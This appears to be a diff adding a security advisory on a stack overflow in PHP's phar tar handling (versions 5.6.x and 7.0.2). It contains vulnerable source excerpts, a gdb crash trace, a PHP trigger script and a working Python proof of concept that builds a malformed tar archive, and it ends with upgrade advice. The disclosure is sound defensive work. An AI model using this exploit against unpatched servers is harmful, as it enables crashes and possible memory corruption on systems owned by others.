@@ -1,0 +1,341 @@
+#+title: php: stack overflow when decompressing tar archives
+#+author: Hans Jerry Illikainen
+#+email: hji@dyntopia.com
+
+A stack overflow may occur in PHP[1] when decompressing tar archives due
+to ~phar_tar_writeheaders()~ potentially copying non-terminated
+linknames from entries parsed by ~phar_parse_tarfile()~ (tested with
+5.6.11, 5.6.17 and 7.0.2).
+
+
+php-5.6.17/ext/phar/tar.h #65..94:
+#+begin_src c
+typedef struct _tar_header {  /* {{{ */
+    [...]
+    char linkname[100]; /* name of linked file */
+    char magic[6];      /* USTAR indicator */
+    char version[2];    /* USTAR version */
+    char uname[32];     /* owner user name */
+    char gname[32];     /* owner group name */
+    char devmajor[8];   /* device major number */
+    char devminor[8];   /* device minor number */
+    char prefix[155];   /* prefix for file name;
+                           the value of the prefix field, if non-null,
+                           is prefixed to the name field to allow names
+                           longer then 100 characters */
+    char padding[12];   /* unused zeroed bytes */
+} PHAR_TAR_PACK tar_header;
+#+end_src
+
+
+php-5.6.17/ext/phar/tar.c #198..678:
+#+begin_src c
+int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */
+{
+    char buf[512], *actual_alias = NULL, *p;
+    phar_entry_info entry = {0};
+    size_t pos = 0, read, totalsize;
+    tar_header *hdr;
+    php_uint32 sum1, sum2, size, old;
+    phar_archive_data *myphar, **actual;
+    int last_was_longlink = 0;
+
+    [...]
+    read = php_stream_read(fp, buf, sizeof(buf));
+    [...]
+
+    do {
+        [...]
+        hdr = (tar_header*) buf;
+        [...]
+
+        if (entry.tar_type == TAR_LINK) {
+            [...]
+            entry.link = estrdup(hdr->linkname);
+        } else if (entry.tar_type == TAR_SYMLINK) {
+            entry.link = estrdup(hdr->linkname);
+        }
+        [...]
+        read = php_stream_read(fp, buf, sizeof(buf));
+        [...]
+    } while (read != 0);
+    [...]
+}
+/* }}} */
+#+end_src
+
+
+linkname is expected to be <=100 bytes and it's estrdup:ed from
+~((tar_header *)buf)->linkname~ to ~entry.link~.  However, since there's
+no guarantee that ~linkname~ or any of the following buffers are
+NUL-terminated, the resulting ~entry.link~ may be at least
+sizeof(linkname) + ... + sizeof(padding) = 355 bytes (and possibly
+bigger depending on where \0 is encountered).
+
+As the header is later written in ~phar_tar_writeheaders()~, linkname is
+strncpy:d to ~char linkname[100]~ with a len based on the source string.
+
+php-5.6.17/ext/phar/tar.c #688..835:
+#+begin_src c
+static int phar_tar_writeheaders(void *pDest, void *argument TSRMLS_DC) /* {{{ */
+{
+    tar_header header;
+    [...]
+    phar_entry_info *entry = (phar_entry_info *) pDest;
+
+    [...]
+    if (entry->link) {
+        strncpy(header.linkname, entry->link, strlen(entry->link));
+    }
+    [...]
+}
+/* }}} */
+#+end_src
+
+
+With php-5.6.17 compiled with -D_FORTIFY_SOURCE=2:
+
+#+begin_src sh
+$ python crash.py crash.tar
+$ gdb --args php-5.6.17/bin/php phar.php crash.tar ext
+(gdb) b tar.c:490
+(gdb) r
+Breakpoint 1, phar_parse_tarfile [...]
+490    entry.link = estrdup(hdr->linkname);
+
+(gdb) call strlen(hdr->linkname)
+$1 = 617
+(gdb) printf "%s\n", hdr->linkname
+linkname...linkname...linkname...linkname...linkname...linkname...
+linkname...linkname...linkname...lmagic...uname...uname...uname...
+uname...gname...gname...gname...gname...major...minor...prefix...
+prefix...prefix...prefix...prefix...prefix...prefix...prefix...
+prefix...prefix...prefix...prefix...prefix...prefix...prefix...
+prefix...prefix...prpadding...paprefix...prefix...prefix...
+prefix...prefix...prefix...prefix...prefix...prefix...prefix...
+prefix...prefix...prefix...prefix...prefix...prefix...prefix...
+pr/name...name...name...name...name...name...name...name...name...
+name...name...name...name...name...na?????
+
+(gdb) b strncpy
+(gdb) c
+Breakpoint 2, phar_tar_writeheaders [...]
+756    strncpy(header.linkname, entry->link, strlen(entry->link));
+(gdb) p sizeof(header.linkname)
+$2 = 100
+
+(gdb) s
+strncpy (__len=617, __src=0x7ffff7fdbbe0 "linkname...linkname...
+linkname...linkname...linkname...linkname...linkname...linkname...
+linkname...lmagic...uname...uname...uname...uname...gname...gname...
+gname...gname...major...minor...prefix...pre"..., __dest=0x7fffffffa13d "")
+at /usr/include/x86_64-linux-gnu/bits/string3.h:126
+126    return __builtin___strncpy_chk (__dest, __src, __len, __bos (__dest));
+
+(gdb) c
+Continuing.
+ *** buffer overflow detected ***: /home/php/php-5.6.17/bin/php terminated
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x78c4e)[0x7ffff6fa7c4e]
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff7047e8c]
+/lib/x86_64-linux-gnu/libc.so.6(+0x116e80)[0x7ffff7045e80]
+/lib/x86_64-linux-gnu/libc.so.6(+0x116319)[0x7ffff7045319]
+/home/php/php-5.6.17/bin/php[0x5983e4]
+/home/php/php-5.6.17/bin/php(zend_hash_apply_with_argument+0x79)[0x6f4cf9]
+/home/php/php-5.6.17/bin/php[0x59aa84]
+/home/php/php-5.6.17/bin/php[0x5af476]
+/home/php/php-5.6.17/bin/php[0x5ba050]
+/home/php/php-5.6.17/bin/php[0x5baf2a]
+/home/php/php-5.6.17/bin/php[0x79543f]
+/home/php/php-5.6.17/bin/php(execute_ex+0x40)[0x723a50]
+/home/php/php-5.6.17/bin/php(zend_execute_scripts+0x180)[0x6e7dd0]
+/home/php/php-5.6.17/bin/php(php_execute_script+0x280)[0x683160]
+/home/php/php-5.6.17/bin/php[0x796f32]
+/home/php/php-5.6.17/bin/php[0x423c9e]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff6f4fa40]
+/home/php/php-5.6.17/bin/php(_start+0x29)[0x423de9]
+======= Memory map: ========
+00400000-00bff000 r-xp 00000000 08:01 557690                             /home/php/php-5.6.17/bin/php
+00dfe000-00e8f000 r--p 007fe000 08:01 557690                             /home/php/php-5.6.17/bin/php
+00e8f000-00e98000 rw-p 0088f000 08:01 557690                             /home/php/php-5.6.17/bin/php
+00e98000-01051000 rw-p 00000000 00:00 0                                  [heap]
+7ffff44f3000-7ffff4931000 r--p 00000000 08:01 136079                     /usr/lib/locale/locale-archive
+7ffff4931000-7ffff4947000 r-xp 00000000 08:01 786971                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff4947000-7ffff4b46000 ---p 00016000 08:01 786971                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff4b46000-7ffff4b47000 r--p 00015000 08:01 786971                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff4b47000-7ffff4b48000 rw-p 00016000 08:01 786971                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff4b48000-7ffff4cbb000 r-xp 00000000 08:01 133608                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
+7ffff4cbb000-7ffff4eba000 ---p 00173000 08:01 133608                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
+7ffff4eba000-7ffff4ec4000 r--p 00172000 08:01 133608                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
+7ffff4ec4000-7ffff4ec6000 rw-p 0017c000 08:01 133608                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
+7ffff4ec6000-7ffff4eca000 rw-p 00000000 00:00 0
+7ffff4eca000-7ffff6780000 r-xp 00000000 08:01 140633                     /usr/lib/x86_64-linux-gnu/libicudata.so.55.1
+7ffff6780000-7ffff697f000 ---p 018b6000 08:01 140633                     /usr/lib/x86_64-linux-gnu/libicudata.so.55.1
+7ffff697f000-7ffff6980000 r--p 018b5000 08:01 140633                     /usr/lib/x86_64-linux-gnu/libicudata.so.55.1
+7ffff6980000-7ffff6981000 rw-p 018b6000 08:01 140633                     /usr/lib/x86_64-linux-gnu/libicudata.so.55.1
+7ffff6981000-7ffff699a000 r-xp 00000000 08:01 787064                     /lib/x86_64-linux-gnu/libz.so.1.2.8
+7ffff699a000-7ffff6b99000 ---p 00019000 08:01 787064                     /lib/x86_64-linux-gnu/libz.so.1.2.8
+7ffff6b99000-7ffff6b9a000 r--p 00018000 08:01 787064                     /lib/x86_64-linux-gnu/libz.so.1.2.8
+7ffff6b9a000-7ffff6b9b000 rw-p 00019000 08:01 787064                     /lib/x86_64-linux-gnu/libz.so.1.2.8
+7ffff6b9b000-7ffff6d1a000 r-xp 00000000 08:01 140629                     /usr/lib/x86_64-linux-gnu/libicuuc.so.55.1
+7ffff6d1a000-7ffff6f1a000 ---p 0017f000 08:01 140629                     /usr/lib/x86_64-linux-gnu/libicuuc.so.55.1
+7ffff6f1a000-7ffff6f2a000 r--p 0017f000 08:01 140629                     /usr/lib/x86_64-linux-gnu/libicuuc.so.55.1
+7ffff6f2a000-7ffff6f2b000 rw-p 0018f000 08:01 140629                     /usr/lib/x86_64-linux-gnu/libicuuc.so.55.1
+7ffff6f2b000-7ffff6f2f000 rw-p 00000000 00:00 0
+7ffff6f2f000-7ffff70ef000 r-xp 00000000 08:01 786945                     /lib/x86_64-linux-gnu/libc-2.21.so
+7ffff70ef000-7ffff72ef000 ---p 001c0000 08:01 786945                     /lib/x86_64-linux-gnu/libc-2.21.so
+7ffff72ef000-7ffff72f3000 r--p 001c0000 08:01 786945                     /lib/x86_64-linux-gnu/libc-2.21.so
+7ffff72f3000-7ffff72f5000 rw-p 001c4000 08:01 786945                     /lib/x86_64-linux-gnu/libc-2.21.so
+7ffff72f5000-7ffff72f9000 rw-p 00000000 00:00 0
+7ffff72f9000-7ffff74a6000 r-xp 00000000 08:01 134031                     /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.2
+7ffff74a6000-7ffff76a6000 ---p 001ad000 08:01 134031                     /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.2
+7ffff76a6000-7ffff76ae000 r--p 001ad000 08:01 134031                     /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.2
+7ffff76ae000-7ffff76b0000 rw-p 001b5000 08:01 134031                     /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.2
+7ffff76b0000-7ffff76b1000 rw-p 00000000 00:00 0
+7ffff76b1000-7ffff76b4000 r-xp 00000000 08:01 786959                     /lib/x86_64-linux-gnu/libdl-2.21.so
+7ffff76b4000-7ffff78b3000 ---p 00003000 08:01 786959                     /lib/x86_64-linux-gnu/libdl-2.21.so
+7ffff78b3000-7ffff78b4000 r--p 00002000 08:01 786959                     /lib/x86_64-linux-gnu/libdl-2.21.so
+7ffff78b4000-7ffff78b5000 rw-p 00003000 08:01 786959                     /lib/x86_64-linux-gnu/libdl-2.21.so
+7ffff78b5000-7ffff79bc000 r-xp 00000000 08:01 786990                     /lib/x86_64-linux-gnu/libm-2.21.so
+7ffff79bc000-7ffff7bbb000 ---p 00107000 08:01 786990                     /lib/x86_64-linux-gnu/libm-2.21.so
+7ffff7bbb000-7ffff7bbc000 r--p 00106000 08:01 786990                     /lib/x86_64-linux-gnu/libm-2.21.so
+7ffff7bbc000-7ffff7bbd000 rw-p 00107000 08:01 786990                     /lib/x86_64-linux-gnu/libm-2.21.so
+7ffff7bbd000-7ffff7bd4000 r-xp 00000000 08:01 787034                     /lib/x86_64-linux-gnu/libresolv-2.21.so
+7ffff7bd4000-7ffff7dd4000 ---p 00017000 08:01 787034                     /lib/x86_64-linux-gnu/libresolv-2.21.so
+7ffff7dd4000-7ffff7dd6000 r--p 00017000 08:01 787034                     /lib/x86_64-linux-gnu/libresolv-2.21.so
+7ffff7dd6000-7ffff7dd7000 rw-p 00019000 08:01 787034                     /lib/x86_64-linux-gnu/libresolv-2.21.so
+7ffff7dd7000-7ffff7dd9000 rw-p 00000000 00:00 0
+7ffff7dd9000-7ffff7dfd000 r-xp 00000000 08:01 786921                     /lib/x86_64-linux-gnu/ld-2.21.so
+7ffff7e51000-7ffff7fea000 rw-p 00000000 00:00 0
+7ffff7ff5000-7ffff7ff8000 rw-p 00000000 00:00 0
+7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
+7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7ffc000-7ffff7ffd000 r--p 00023000 08:01 786921                     /lib/x86_64-linux-gnu/ld-2.21.so
+7ffff7ffd000-7ffff7ffe000 rw-p 00024000 08:01 786921                     /lib/x86_64-linux-gnu/ld-2.21.so
+7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+Program received signal SIGABRT, Aborted.
+0x00007ffff6f64267 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:55
+55    ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
+(gdb)
+#+end_src
+
+
+* phar.php
+#+begin_src php
+<?php
+if ($argc != 3) {
+    die("$argv[0] filename extension\n");
+}
+
+$p = new PharData($argv[1]);
+$newp = $p->decompress($argv[2]);
+?>
+#+end_src
+
+
+* crash.py
+#+begin_src python
+# This creates an example .tar with:
+#
+# 1. a pax header with a ustar\x0000 magic
+# 2. a symbolic link with mostly bogus header data
+#
+# `old' (tar.c:226) will be false due to #1, and with the prefix data of #2,
+# `hdr->prefix' will be concatenated with `hdr->name' in `char name[256]',
+# starting on tar.c:401:
+#
+#     else if (!last_was_longlink && !old && hdr->prefix[0] != 0) { ... }
+#
+# hdr->linkname..hdr->padding in #2 won't be NUL-terminated, resulting
+# in a longer than 100 byte `entry.link' in tar.c:490:
+#
+#     entry.link = estrdup(hdr->linkname);
+#
+# With the php5-cli (5.6.11+dfsg-1ubuntu3.1) package provided by Ubuntu
+# 15.10, as well as with a self-built php-5.6.17, `hdr' is followed by
+# the concatenated `name' buffer.
+#
+# The resulting `entry.link' will thus be hdr->linkname..hdr->padding
+# (355 bytes) + name (256 bytes) + whatever else until a NUL byte is
+# encountered.
+#
+# The invocation of `strncpy()' in `phar_tar_writeheaders()' (tar.c:756)
+# will therefore end up copying >= 611 bytes to `header.linkname' (100
+# bytes)
+#
+#     strncpy(header.linkname, entry->link, strlen(entry->link));
+#
+import sys
+import struct
+from tarfile import (TarFile, TarInfo, calc_chksums, stn, itn,
+                     POSIX_MAGIC, PAX_FORMAT, REGTYPE, BLOCKSIZE, SYMTYPE)
+
+class Info(TarInfo):
+    @staticmethod
+    def _create_header(info, format):
+        """
+        _create_header() is more or less copy-pasted from
+        python2.7/tarfile.py with some minor changes to avoid
+        NUL-termination.
+        """
+        magic = POSIX_MAGIC
+        if info["name"] != "././@PaxHeader":
+            magic = "magic..."
+
+        parts = [
+            stn(info.get("name", ""), 100),
+            itn(info.get("mode", 0) & 07777, 8, format),
+            itn(info.get("uid", 0), 8, format),
+            itn(info.get("gid", 0), 8, format),
+            itn(info.get("size", 0), 12, format),
+            itn(info.get("mtime", 0), 12, format),
+            "        ", # checksum field
+            info.get("type", REGTYPE),
+            stn(info.get("linkname", ""), 100),
+            pad(magic, 8),
+            pad("uname...", 32),
+            pad("gname...", 32),
+            pad("major...", 8),
+            pad("minor...", 8),
+            pad("prefix...", 155),
+            pad("padding...", 12)
+        ]
+
+        buf = struct.pack("%ds" % BLOCKSIZE, "".join(parts))
+        chksum = calc_chksums(buf[-BLOCKSIZE:])[0]
+        buf = buf[:-364] + "%06o\0" % chksum + buf[-357:]
+        return buf
+
+def pad(s, length):
+    return (s * length)[:length]
+
+def main():
+    if len(sys.argv) != 2:
+        sys.exit("%s out" % sys.argv[0])
+
+    tar = TarFile(sys.argv[1], "w", format=PAX_FORMAT)
+
+    info = Info()
+    info.type = SYMTYPE
+    info.linkname = pad("linkname...", 155)
+    info.name = pad("name...", 100)
+
+    tar.addfile(info)
+    tar.close()
+
+if __name__ == "__main__":
+    main()
+#+end_src
+
+
+* Solution
+
+Update to php 5.5.32, 5.6.18 or 7.0.3.
+
+
+* Footnotes
+
+[1] https://bugs.php.net/bug.php?id=71488
